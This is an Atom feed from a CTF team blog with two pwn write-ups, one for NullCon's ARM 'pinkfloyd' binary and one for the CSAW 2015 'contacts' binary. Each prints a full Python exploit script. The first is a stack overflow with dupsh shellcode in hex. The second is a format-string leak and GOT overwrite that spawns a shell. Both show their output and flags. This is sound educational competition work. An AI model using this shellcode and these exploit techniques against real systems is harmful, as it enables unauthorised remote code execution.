<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Pwn, | GeeksSpeak Team Blog]]></title>
  <link href="http://geeksspeak.github.io/blog/categories/pwn/atom.xml" rel="self"/>
  <link href="http://geeksspeak.github.io/"/>
  <updated>2016-01-31T16:08:00-05:00</updated>
  <id>http://geeksspeak.github.io/</id>
  <author>
    <name><![CDATA[GeeksSpeak]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Nullcon CTF - HackIM - Expl 100 - ARM]]></title>
    <link href="http://geeksspeak.github.io/blog/2016/01/31/nullcon-ctf-hackim-expl-100-arm/"/>
    <updated>2016-01-31T15:44:47-05:00</updated>
    <id>http://geeksspeak.github.io/blog/2016/01/31/nullcon-ctf-hackim-expl-100-arm</id>
    <content type="html"><![CDATA[<p>Hi,</p>

<p>I participate in NullCon CTF with my team in this week. one of the challenge i solved was an arm binary pwn one.</p>

<pre><code class="bash">hamidx9@expl:~/ctf/nullcon/expl100$ file pinkfloyd
pinkfloyd: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=62c86841d0c0384ce39d70fef5afe0eee5cad7b4, not stripped
</code></pre>

<p><code>pinkfloyd</code> is a arm binary which provide saving playlist functionality. we can see two methods <em>create, print</em>. Analyzing <code>cmd_do_create</code> gives us the clue that it read from input 3 param, <em>name, tag, # of songs</em>. A little more reading the diseases shows if we use more that 84 chars in tag we overflow the stack. So we can abuse this method.</p>

<pre><code>gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
</code></pre>

<p>Also <code>checksec</code> shows us we have a very suitable case, we can execute our <code>shellcode</code>.  For hijacking <code>pc</code> we should overwrite <code>lr</code> register so on returning from the call, we have full control. based on <code>add_playlist</code> function <code>myplaylist</code> on <code>bss</code> always has last playlist struct address. So we should change our <code>pc</code> to playlist struct address to run our shellcode which exists in playlist name. Also we should notice our sock fd is <code>4</code> so we need a <code>dupsh(4)</code> shellcode. Ok, too much talking, let’s do this.</p>

<pre><code class="python">
#!/usr/bin/python

# By HAMIDx9 :: GeeksSpeak :: ctf.nullcon.net HackIM :: Exploit 100

import struct
from hexdump import hexdump
import socket
import telnetlib

q = lambda x: struct.pack("&lt;I", x)

#ret = q(0x0002605c) 

shellcode = "01608fe216ff2fe14ff002014ff03f0708460d462846284401df0139fad504a082ea02024ff00b0705b4694601df01012f62696e2f736800".decode("hex") 
# Custom dupsh(4) thumb shellcode based on current execution
# To see whats going on : 
# from pwn import *
# context(arch="thumb", os="linux")
# print asm(shellcode[4:]) # skip change to thumb mode arm shellcode

hexdump(shellcode)

s = socket.socket()
s.connect(("52.72.171.221", 9981))
#s.connect(("localhost", 9981))

s.recv(1024)
s.send("create\n") # create a playlist

s.recv(1024)
s.send(shellcode+"\n") # playlist name

s.recv(1024)
#s.send("A"*100+"\n") # crashes in playlist tag
s.send("A"*80+"BBBB"+q(0x8C0CC)+"\n") # set lr to myplaylist to jump to it then,
# after returning from cmd_do_create pop {lr, pc} pops heap address of playlist name in pc which has our dupsh(4) shellcode

s.recv(1024)
s.send("1"+"\n") # playlist tracks 


print “[+] Here you go”
t = telnetlib.Telnet()
t.sock = s

t.interact() # interact
</code></pre>

<p>And running the expl:
<code>bash
KernelsCallMe:exp100 hamidx9$ python sol.py
00000000: 01 60 8F E2 16 FF 2F E1  4F F0 02 01 4F F0 3F 07  .`..../.O...O.?.
00000010: 08 46 0D 46 28 46 28 44  01 DF 01 39 FA D5 04 A0  .F.F(F(D...9....
00000020: 82 EA 02 02 4F F0 0B 07  05 B4 69 46 01 DF 01 01  ....O.....iF....
00000030: 2F 62 69 6E 2F 73 68 00                           /bin/sh.
[+] Here you go
cat *
cat: bin: Is a directory
cat: dev: Is a directory
flag-{intr0-70-ARM-pwn4g3-4-fuN-n-pr0Fi7}
</code></p>

<p>So the flag is <code>flag-{intr0-70-ARM-pwn4g3-4-fuN-n-pr0Fi7}</code> and we have 100 pts.</p>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW 2015 - PWN250 - Contacts]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts/"/>
    <updated>2015-09-21T09:13:52-04:00</updated>
    <id>http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts</id>
    <content type="html"><![CDATA[<p><strong>CSAW 2015 contacts Writeup</strong><br/>
<strong>Point = 250</strong><br/>
<strong>Category = Exploitable</strong></p>

<p>Hi,</p>

<p>we are given a binary <code>contacts</code>,</p>

<pre><code>hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ file contacts
contacts: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=a2c73697f9555c6be6c57478029e352df1f28cc8, stripped
</code></pre>

<p>The binary seems to be a contact manager, based on my analysis it has a buffer at <code>BSS</code>, and every time we create a contact this structure will be located at the buffer:</p>

<pre><code>struct contact {
    char *desc;
    char *num;
    char name[64];
    unsigned int desc_length;
    int enabled;
};
</code></pre>

<p><code>desc</code> is the contacs description and allocates a buffer with buffer size <code>des_length</code>. <code>num</code> is the contact number with size <code>0xb</code>.</p>

<p>So, we are going to find vulnerabilities.</p>

<!--more-->


<p>I named <code>0x08048980</code> => <code>editCon</code>, this function edites the contact which you give its name, let&rsquo;s check the decompilation:</p>

<pre><code>int __cdecl editCon(int a1)
{
  int n; // [sp+1Ch] [bp-5Ch]@6
  int v3; // [sp+20h] [bp-58h]@5
  int v4; // [sp+24h] [bp-54h]@1
  int v5; // [sp+28h] [bp-50h]@3
  char s; // [sp+2Ch] [bp-4Ch]@1
  int v7; // [sp+6Ch] [bp-Ch]@1

  v7 = *MK_FP(__GS__, 20);
  v4 = a1;
  printf("Name to change? ");
  fgets(&amp;s, 64, stdin);
  if ( strchr(&amp;s, 10) )
    *strchr(&amp;s, 10) = 0;
  v5 = 0;
  while ( 1 )
  {
    if ( v5 &gt; 9 )
    {
      puts("Name not found");
      return *MK_FP(__GS__, 20) ^ v7;
    }
    if ( !strcmp(&amp;s, (v4 + 8)) )
      break;
    ++v5;
    v4 += 80;
  }
  printf("1.Change name\n2.Change description\n&gt;&gt;&gt; ");
  __isoc99_scanf("%u%*c", &amp;v3);
  if ( v3 == 1 )
  {
    printf("New name: ");
    fgets((v4 + 8), n, stdin);
    if ( strchr((v4 + 8), 10) )
      *strchr((v4 + 8), 10) = 0;
  }
  else if ( v3 == 2 )
  {
    free(*v4);
    printf("Length of description: ");
    __isoc99_scanf("%u%*c", &amp;n);
    printf("Description: \n\t");
    *v4 = malloc(n);
    fgets(*v4, n, stdin);
  }
  else
  {
    puts("Bad option");
  }
  return *MK_FP(__GS__, 20) ^ v7;
</code></pre>

<p>As you may noticed when i try to edit the name there is no input length check a buffer overflow vulnerability. but there may be a problem since we don&rsquo;t know it&rsquo;s value <code>n</code>.
this can be fixed by first preparing a description edit, so after entering the function again we have a known size.</p>

<p>and after some diging we can notice there is an another vulnerability,  <code>0x08048bd1</code> => pCon:</p>

<pre><code>int __cdecl pCon(int a1, int a2, int a3, char *format)
{
  printf("\tName: %s\n", a1);
  printf("\tLength %u\n", a2);
  printf("\tPhone #: %s\n", a3);
  printf("\tDescription: ");
  return printf(format);
}
</code></pre>

<p>Here we go, a nice format string vulnerability.</p>

<p>by using these two vulnerabilites we have write-what-where primitive to exploit the binary.</p>

<p>this is my scenario,</p>

<ol>
<li>create a contact.</li>
<li>leak a pointer to locate the <code>system</code> symbol using fmt vuln.</li>
<li>create second contact.</li>
<li>leak second contact decription heap address to have a stable exploitation using fmt vuln.</li>
<li>create third contact.</li>
<li>leak third contact decription heap address to have a stable exploitation using fmt vuln.</li>
<li>Overflow first contact name into the second and use proper description address which leaked before
 and overwrite number pointer to heap by <code>free</code> got address.</li>
<li>Overflow second contact name into the third and use proper description address which leaked before
 and overwrite number pointer to heap by <code>free+2</code> got address.</li>
<li>Edit second and third contacts description to <code>%####x%1$hn</code> and proper number to overwrite <code>free</code> to <code>system</code></li>
<li>Edit first contact description to &lsquo;/bin/sh\x00&rsquo;</li>
<li>delete first contact and pop a shell.</li>
</ol>


<p>Of course null byte is not our concern since fgets is used in reading procedure.</p>

<p><strong> please notice i used <code>precision</code> task libc version </strong> but you can use libc_database to find a proper one blindly.</p>

<p>I should declare there maybe another or better solution but this let me in ;)</p>

<p>and finally out exploit:</p>

<pre><code>#!/usr/bin/python


import telnetlib
import struct
import socket
import re
import time
from hexdump import hexdump
import pdb

#system_offset = 0x22a32 # local - ubuntu 15.04 - libc6-2.21-0ubuntu4
system_offset = 0x2670d # Remote -  ubuntu 14.04.2 - libc6_2.19-0ubuntu6.

def readuntil(f, delim='&gt;&gt;&gt; '):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        assert len(c) &gt; 0
        data += c
    #print data
    return data

def p(v):
    return struct.pack('&lt;Q', v)

def u(v):
    return struct.unpack('&lt;Q', v)[0]



def create_c(f, n, num, l, desc):
    print "[+] Create Contact"
    f.write("1\n")
    readuntil(f, 'Name: ')
    f.write(n+"\n")
    readuntil(f, ' No: ')
    f.write(num+"\n")
    readuntil(f, 'of description: ')
    f.write(str(l)+"\n")
    readuntil(f, 'Enter description:\n\t\t')
    f.write(desc+"\n")
    #print "MM", f.read(1024)
    readuntil(f)


def edit_con_nameon_desc(f, n, l, v):
    print "[+] Edit Contact"
    f.write("3\n")
    readuntil(f, 'change? ')
    f.write(n+"\n")
    readuntil(f)
    f.write("2\n")
    readuntil(f, 'description: ')
    f.write(str(l)+"\n")
    readuntil(f, 'Description: ')
    f.write(v+"\n")
    readuntil(f)

def edit_con_name(f, n, v):
    print "[+] Edit Contact"
    f.write("3\n")
    readuntil(f, 'change? ')
    f.write(n+"\n")
    readuntil(f)
    f.write("1\n")
    readuntil(f, 'name: ')
    f.write(v+"\n")
    readuntil(f)

def print_c(f):
    print "[+] Print Contact"
    f.write("4\n")
    return readuntil(f)

def delete_c(f, n):
    print "[+] Delete Contact"
    f.write("2\n")
    readuntil(f, 'remove? ')
    f.write(n+"\n")

s = socket.socket()

#s.connect(("54.165.223.128", 2555))
s.connect(("127.0.0.1", 1337))

f = s.makefile('rw', bufsize=0)

readuntil(f)

raw_input("$")

#pdb.set_trace()
create_c(f, "AA", "123123", 200, "%31$p\n")
pr = print_c(f)
address = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
print "[+] address = ", hex(address)
system_offset += address
print "[+] system address = ", hex(system_offset)
edit_con_nameon_desc(f, "AA", 200, "/bin/sh\x00")
create_c(f, "BB", "123123", 200, "%1$p\n")
pr = print_c(f)
heap_addr = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
print "[+] address = ", hex(heap_addr)
heap_addr += 0x10

edit_con_nameon_desc(f, "BB", 200, "BBB")

create_c(f, "CC", "123123", 200, "%1$p\n")
pr = print_c(f)
heap_addr_c = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
print "[+] address = ", hex(heap_addr_c)
heap_addr_c += 0x10

edit_con_nameon_desc(f, "CC", 200, "CCC")

edit_con_name(f, "AA", "AA\x00"+"A"*61+struct.pack("&lt;I", 0xc8)+struct.pack("&lt;I", 0x1)+struct.pack("&lt;I", heap_addr) + struct.pack("&lt;I", 0x0804b014) + "BB\x00\n")

edit_con_name(f, "BB", "BB\x00"+"B"*61+struct.pack("&lt;I", 0xc8)+struct.pack("&lt;I", 0x1)+struct.pack("&lt;I", heap_addr_c) + struct.pack("&lt;I", 0x0804b016) + "CC\x00\n")


edit_con_nameon_desc(f, "BB", 200, "%{}x%1$hn".format(system_offset &amp; 0xffff))
edit_con_nameon_desc(f, "CC", 200, "%{}x%1$hn".format((system_offset &gt;&gt; 16) &amp; 0xffff))
print_c(f)

delete_c(f, "AA")

t = telnetlib.Telnet()
t.sock = s
t.interact()


s.close()
</code></pre>

<p>And running the expl:</p>

<pre><code>hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ python sol.py 
$
[+] Create Contact
[+] Print Contact
[+] address =  0xf75a9a83
[+] system address =  0xf75d0190
[+] Edit Contact
[+] Create Contact
[+] Print Contact
[+] address =  0x9ea10e8
[+] Edit Contact
[+] Create Contact
[+] Print Contact
[+] address =  0x9ea11c8
[+] Edit Contact
[+] Edit Contact
[+] Edit Contact
[+] Edit Contact
[+] Edit Contact
[+] Print Contact
[+] Delete Contact
cat flag
flag{f0rm47_s7r1ng5_4r3_fun_57uff}
</code></pre>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
</feed>
